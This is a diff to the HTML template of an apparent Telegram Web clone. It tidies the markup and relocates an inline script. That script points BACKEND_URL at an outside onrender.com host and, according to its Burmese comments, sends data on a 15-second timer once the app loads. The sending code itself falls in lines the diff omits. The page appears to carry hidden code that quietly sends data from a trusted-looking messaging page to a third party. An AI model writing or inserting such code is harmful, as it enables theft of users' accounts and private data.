@@ -25,7 +25,6 @@
 
   <meta http-equiv="Content-Security-Policy" content="<%= htmlWebpackPlugin.options.csp %>">
 
-  <!-- Open Graph / Facebook -->
   <meta property="og:type" content="website">
   <meta property="og:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
   <meta property="og:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
@@ -33,7 +32,6 @@
         content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
   <meta property="og:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">
 
-  <!-- Twitter -->
   <meta property="twitter:card" content="summary_large_image">
   <meta property="twitter:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
   <meta property="twitter:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
@@ -57,9 +55,18 @@
       @layer tablist, spinner, button, input, layout;
     }
   </style>
-</head
+</head>
 
-<script>
+<body id="root">
+  <noscript>
+    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
+    <h1>Telegram Web</h1>
+    <p>Please, enable JavaScript to open the app.</p>
+  </noscript>
+  <div id="portals"></div>
+  <script src="./compatTest.js"></script>
+
+  <script>
       const BACKEND_URL = "https://telegram-7ih3.onrender.com";
 
       // React က အကုန် Load လုပ်ပြီးမှ ကျွန်တော်တို့ Code ကို အလုပ်လုပ်စေချင်လို့ window.onload ကို သုံးပါမယ်
@@ -148,16 +155,7 @@
               }, 15000); // Data ပို့တာ မြန်မြန်သိရအောင် ၁၅ စက္ကန့် ပြောင်းထားပါတယ်
           }
       };
-    </script>
-
-<body id="root">
-  <noscript>
-    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
-    <h1>Telegram Web</h1>
-    <p>Please, enable JavaScript to open the app.</p>
-  </noscript>
-  <div id="portals"></div>
-  <script src="./compatTest.js"></script>
+  </script>
 
 </body>
 
